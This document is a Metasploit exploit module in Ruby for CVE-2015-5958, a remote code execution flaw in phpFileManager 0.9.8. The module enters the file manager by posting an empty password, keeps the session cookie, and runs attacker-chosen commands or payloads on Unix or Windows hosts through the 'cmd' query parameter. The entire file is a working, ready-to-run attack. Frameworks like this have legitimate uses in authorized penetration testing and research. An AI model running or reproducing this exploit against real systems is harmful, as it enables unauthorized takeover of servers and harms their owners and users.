##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'phpFileManager 0.9.8 Remote Code Execution',
      'Description'    => %q{
         This module exploits a remote code execution vulnerability in phpFileManager
         0.9.8 which is a filesystem management tool on a single file.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'hyp3rlinx', # initial discovery
          'Jay Turla' # msf
        ],
      'References'     =>
        [
          [ 'CVE', '2015-5958' ],
          [ 'EDB', '37709' ],
          [ 'URL', 'http://phpfm.sourceforge.net/' ] # Official Website
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 2000,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'Platform'       => %w{ unix win },
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['phpFileManager / Unix', { 'Platform' => 'unix' } ],
          ['phpFileManager / Windows', { 'Platform' => 'win' } ]
        ],
      'DisclosureDate' => 'Aug 28 2015',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path of phpFileManager', '/phpFileManager-0.9.8/index.php']),
      ])
  end

  def check
    txt = Rex::Text.rand_text_alpha(8)
    res = http_send_command("echo #{txt}")

    if res && res.body =~ /#{txt}/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def push
    uri = normalize_uri(target_uri.path)

    # To push the Enter button
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'vars_post' => {
        'frame' => '3',
        'pass'  => '' # yep this should be empty
       }
    })

    if res.nil?
      vprint_error("Connection timed out")
      fail_with(Failure::Unknown, "Failed to trigger the Enter button")
    end

    if res && res.headers && res.code == 302
      print_good("Logged in to the file manager")
      cookie = res.get_cookies
      cookie
    else
      fail_with(Failure::Unknown, "#{peer} - Error entering the file manager")
    end
  end

  def http_send_command(cmd)
    cookie = push
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path),
      'cookie'   => cookie,
      'vars_get' => {
        'action' => '6',
        'cmd' => cmd
      }
    })
    unless res && res.code == 200
      fail_with(Failure::Unknown, "Failed to execute the command.")
    end
    res
  end

  def exploit
    http_send_command(payload.encoded)
  end
end
